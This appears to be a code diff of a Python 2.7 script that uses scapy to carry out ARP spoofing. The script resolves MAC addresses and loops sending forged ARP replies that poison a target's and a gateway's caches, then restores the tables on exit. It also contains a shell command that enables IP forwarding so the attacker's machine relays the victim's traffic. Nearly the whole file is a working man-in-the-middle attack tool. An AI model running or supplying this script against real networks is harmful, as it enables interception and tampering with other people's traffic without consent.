@@ -1,58 +1,70 @@
+#!/usr/bin/env python
+# Python 2.7
+
 import scapy.all as scapy
-import time,subprocess
+import time
+import sys
+
+def get_mac(ip):
+	arp_request = scapy.ARP(pdst=ip)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arp_request_broadcast = broadcast/arp_request
+	answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
+
+	return answered_list[0][1].hwsrc
 
 
-def scan_network():
+def spoof(target_ip, spoof_ip):
 
-    print "Perform Scanning : "
+	target_mac = get_mac(target_ip)
 
-    ip = raw_input("Please Enter IP address : ")
-    arp_request = scapy.ARP(pdst=ip)
-    boradcast_macaddress = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_packet = boradcast_macaddress / arp_request
+	"""
+	Scapy Usage Info:
+	op 1 = ARP Request
+	op 2 = ARP Response
+	pdst = IP of target
+	hwdst = MAC of target
+	psrc = IP of router
+	"""
 
-    answered = scapy.srp(arp_packet, timeout=1)[0]
+	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 
-    print "ip" + "\t" * 4 + "mac" + "\t" * 4
+	#To preview packet before continuing
+	#print(packet.show())
+	#print(packet.summary())
 
-    for answer in answered:
-
-        target_dictionary[answer[1].psrc] = answer[1].hwsrc
-
-
-
-    pass
-
-
-def spoof_target(target_ip, spoof_ip):
-
-    arp_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_dictionary[target_ip],psrc=spoof_ip)
-    scapy.send(arp_packet,verbose=False)
+	scapy.send(packet, verbose=False)
 
 
-    pass
+def restore(destination_ip, source_ip):
+	destination_mac = get_mac(destination_ip)
+	source_mac = get_mac(source_ip)
+	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
 
+	#To preview packet before continuing
+	#print(packet.show())
+	#print(packet.summary())
 
-def show_targets(target_dictionary):
-    for ip, mac in target_dictionary.items():
+	scapy.send(packet, count=4, verbose=False)
 
-        print ip +" : "+ mac +"\n"
-    pass
+target_ip = ""
+gateway_ip = ""
 
-
-if __name__ == '__main__':
-    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
-    target_dictionary = {}
-    scan_network()
-    show_targets(target_dictionary)
-    target_ip = raw_input("Please Enter Target IP: ")
-    router_ip = raw_input("Please Enter Router ip: ")
-
-    try:
-        while True:
-            spoof_target(target_ip, router_ip)
-            spoof_target(router_ip, target_ip)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print "Quitting...."
-        exit()
+sent_packets_count = 0
+try:
+	while True:
+		spoof(target_ip, gateway_ip)
+		spoof(gateway_ip, target_ip)
+		sent_packets_count += 2
+		print("\r[+] Packets sent: " + str(sent_packets_count)),
+		sys.stdout.flush()
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
+	restore(target_ip, gateway_ip)
+	restore(gateway_ip, target_ip)
+	print("[+] ARP tables restored.")
+"""
+"echo 1 > /proc/sys/netipv4/ip_forward"
+Opens up Kali to forward traffic on behalf of target
+"""
